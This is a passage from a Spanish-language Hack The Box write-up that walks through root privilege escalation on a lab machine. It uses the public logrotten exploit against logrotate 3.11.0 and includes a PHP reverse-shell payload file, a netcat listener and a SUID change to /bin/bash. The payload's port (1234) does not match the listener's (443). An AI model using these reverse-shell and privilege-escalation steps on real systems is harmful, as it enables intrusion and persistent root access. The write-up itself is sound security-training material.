2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1065   | /usr/sbin/cron <span class="nt">-f</span> 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>10     | 
2022/01/24 04:29:40 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1      | /sbin/init auto automatic-ubiquity noprompt 
2022/01/24 04:29:44 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4167   | /usr/sbin/logrotate <span class="nt">-f</span> /root/log.cfg 
2022/01/24 04:29:44 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4166   | /bin/sh /root/log.sh 
2022/01/24 04:29:44 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4168   | <span class="nb">sleep </span>5 
2022/01/24 04:29:49 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4169   | /bin/sh /root/log.sh 
2022/01/24 04:29:49 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4171   | /usr/sbin/logrotate <span class="nt">-f</span> /root/log.cfg 
2022/01/24 04:29:49 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4172   | <span class="nb">sleep </span>5 
2022/01/24 04:29:50 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4173   | 
^CExiting program... <span class="o">(</span>interrupt<span class="o">)</span>
reader@book:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que el usuario <strong>root</strong> está ejecutando <code class="language-plaintext highlighter-rouge">/usr/sbin/logrotate -f /root/log.cfg</code>, por lo que vamos a ver la versión de <code class="language-plaintext highlighter-rouge">logrotate</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:/dev/shm<span class="nv">$ </span>logrotate <span class="nt">--version</span>
logrotate 3.11.0
reader@book:/dev/shm<span class="nv">$ </span>
</code></pre></div></div>

<p>Vamos a buscar posibles exploits que nos ayuden a escalar privilegios abusando de dicho binario y encontramos <a href="https://github.com/whotwagner/logrotten">logrotten</a>, en donde nos explican que pasos debemos de seguir; así que vamos a hacerlo.</p>

<p>Primero nos vamos a crear el archivo  <code class="language-plaintext highlighter-rouge">logrotten.c</code> en la máquina víctima y vamos a compilarlo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:/dev/shm<span class="nv">$ </span>nano logrotten.c
reader@book:/dev/shm<span class="nv">$ </span>gcc logrotten.c <span class="nt">-o</span> logrotten
reader@book:/dev/shm<span class="nv">$ </span>ll
total 1064
drwxrwxrwt  2 root   root       100 Jan 24 04:42 ./
drwxr-xr-x 18 root   root      3960 Jan 24 04:16 ../
<span class="nt">-rwxrwxr-x</span>  1 reader reader   17984 Jan 24 04:42 logrotten<span class="k">*</span>
<span class="nt">-rw-rw-r--</span>  1 reader reader    7343 Jan 24 04:42 logrotten.c
<span class="nt">-rwxrwxr-x</span>  1 reader reader 1059492 Jan 24 00:53 pspy<span class="k">*</span>
reader@book:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<p>De acuerdo con lo que nos dice el autor del exploit, debemos crear un archivo de nombre `
payloadfile<code class="language-plaintext highlighter-rouge"> que almacene un comando de reverse shell, que para este caso vamos a utilizar </code>bash` y le daremos permisos de ejecución.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:/dev/shm<span class="nv">$ </span>nano payloadfile
reader@book:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x payloadfile 
reader@book:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>payloadfile 
php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
reader@book:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<p>Por último, necesitamos apuntar hacia un archivo de extensión <strong>.log</strong>, el cual lo encontramos en la ruta del usuario <strong>reader</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:~/backups<span class="nv">$ </span>ll
total 12
drwxr-xr-x 2 reader reader 4096 Jul 20  2021 ./
drwxr-xr-x 7 reader reader 4096 Jan 24 04:42 ../
<span class="nt">-rw-r--r--</span> 1 reader reader    0 Jan 29  2020 access.log
<span class="nt">-rw-r--r--</span> 1 reader reader   91 Jan 29  2020 access.log.1
reader@book:~/backups<span class="nv">$ </span>
</code></pre></div></div>

<p>Ejecutamos el exploit de acuerdo a como nos indica el repositorio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:/dev/shm<span class="nv">$ </span>./logrotten <span class="nt">-p</span> payloadfile /home/reader/backups/access.log
Waiting <span class="k">for </span>rotating /home/reader/backups/access.log...
</code></pre></div></div>

<p>Ahora, ingresamos a la máquina con otra sesión, nos ponemos en escucha por el puerto 443 y en la nueva sesión escribimos cualquier cosa en el archivo <code class="language-plaintext highlighter-rouge">/home/reader/backups/access.log</code> (<strong>Nota</strong>: Es posible que no nos jale a la primera, así que hay que volver a ejecutar el exploit hasta que nos entable una reverse shell):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"k4miyo"</span> <span class="o">&gt;</span> /home/reader/backups/access.log
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.176] 48078
<span class="c"># whoami</span>
root
</code></pre></div></div>

<p>Debido a que la sesión muere despúes de unos segundos, vamos a tratar de darle permisos SUID a la <code class="language-plaintext highlighter-rouge">/bin/bash</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.176] 52130
<span class="c"># chmod 4755 /bin/bash</span>
<span class="c"># Hangup</span>
</code></pre></div></div>

<p>En cualquier sesión que tengamos, validamos los permisos de <code class="language-plaintext highlighter-rouge">/bin/bash</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@book:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="nt">-rwsr-xr-x</span> 1 root root 1113504 Apr  4  2018 /bin/bash
reader@book:/dev/shm<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-4.4# <span class="nb">whoami
</span>root
bash-4.4#
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">LFI</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-28T00:00:00-06:00">January 28, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-forwardslash/" class="pagination--pager" title="Hack The Box ForwardSlash
">Previous</a>
    
    
      <a href="/htb-sauna/" class="pagination--pager" title="Hack The Box Sauna
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
